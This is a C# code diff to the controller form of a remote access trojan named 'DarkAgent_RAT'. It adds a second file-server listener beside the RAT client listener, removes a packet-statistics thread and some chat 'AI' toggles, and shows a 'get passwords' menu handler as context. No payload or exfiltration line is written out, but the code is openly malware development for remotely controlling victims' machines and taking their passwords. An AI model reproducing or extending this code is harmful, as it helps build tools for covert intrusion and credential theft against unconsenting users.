@@ -8,16 +8,17 @@ using System.Windows.Forms;
 using DarkAgent_RAT.src.Network;
 using DarkAgent_RAT.src;
 using DarkAgent_RAT.src.Network.DataNetwork.Packets;
+using DarkAgent_RAT.src.Network.FileServer.Packets;
 using System.Threading;
 using DarkAgent_RAT.src.Utils;
 using DarkAgent_RAT.src.Engines;
 using DarkAgent_RAT.src.Network.DataNetwork.Packets.Send;
 using DarkAgent_RAT.src.Events;
-using DarkAgent_RAT.src.AI;
 using System.Net;
 using NATUPNPLib;
 using System.Collections;
 using DarkAgent_RAT.src.Network.DataNetwork;
+using DarkAgent_RAT.src.Network.FileServer;
 
 namespace DarkAgent_RAT
 {
@@ -33,26 +34,25 @@ namespace DarkAgent_RAT
         }
 
         private List<RatClientListener> _listener;
+        private List<FileClientListener> _FileListener;
         private MaxConnections maxConnections;
+        private File_MaxConnections File_maxConnections;
         Thread RefreshThread;
-        WebsiteAI websiteAI;
 
         private void Form1_Load(object sender, EventArgs e)
         {
             //Events
             ClientDisconnectEvent.ClientDisconnect += new ClientDisconnectHandler(onClientDisconnect);
 
-            Control.CheckForIllegalCrossThreadCalls = false;
+            CheckForIllegalCrossThreadCalls = false;
 
             settings.MainForm = this;
             _listener = new List<RatClientListener>();
+            _FileListener = new List<FileClientListener>();
             maxConnections = new MaxConnections();
+            File_maxConnections = new File_MaxConnections();
             ClientPacketProcessor.Initialize();
-
-            RefreshThread = new Thread(new ThreadStart(RefreshInfo));
-            RefreshThread.Start();
-            Talker talker = new Talker();
-            websiteAI = new WebsiteAI();
+            FileClientPacketProcessor.Initialize();
         }
 
         #region Speficic Events
@@ -63,21 +63,6 @@ namespace DarkAgent_RAT
             {
                 if (listView3.Items[i].SubItems[3].Text == e.RemoteIP)
                     listView3.Items.RemoveAt(i);
-            }
-        }
-
-        #endregion
-
-        #region Other
-
-        private void RefreshInfo()
-        {
-            while (true)
-            {
-                Thread.Sleep(1000);
-                settings.MainForm.label1.Text = "Total incoming packets: " + settings.ReceivedPackets;
-                settings.MainForm.label2.Text = "Total sended packets: " + settings.SendedPackets;
-                settings.MainForm.label3.Text = "Connected clients: " + settings.ClientsConnected;
             }
         }
 
@@ -147,7 +132,10 @@ namespace DarkAgent_RAT
                 }catch{}
             }
 
-            _listener.Add(new RatClientListener((int)numericUpDown3.Value, (int)numericUpDown1.Value));
+            if(!checkBox4.Checked)
+                _listener.Add(new RatClientListener((int)numericUpDown3.Value, (int)numericUpDown1.Value));
+            else
+                _FileListener.Add(new FileClientListener((int)numericUpDown3.Value, (int)numericUpDown1.Value));
 
             string[] str = new string[2];
             str[0] = numericUpDown3.Value.ToString();
@@ -173,31 +161,14 @@ namespace DarkAgent_RAT
 
                         if(_listener.Contains(_listener[i]))
                             _listener[i].Close();
+                        else if(_FileListener.Contains(_FileListener[i]))
+                            _FileListener[i].Close();
 
                         listView4.SelectedItems[i].Remove();
                     }catch{}
 
                 }
             }
-        }
-
-        private void checkBox1_CheckedChanged(object sender, EventArgs e)
-        {
-            if(checkBox1.Checked)
-            {
-                settings.AI = true;
-                Talker.Instance.Hello();
-            }
-            else
-                settings.AI = false;
-        }
-
-        private void checkBox2_CheckedChanged(object sender, EventArgs e)
-        {
-            if(checkBox2.Checked)
-                websiteAI.Enabled = true;
-            else
-                websiteAI.Enabled = false;
         }
 
         private void getPasswordsToolStripMenuItem_Click(object sender, EventArgs e)
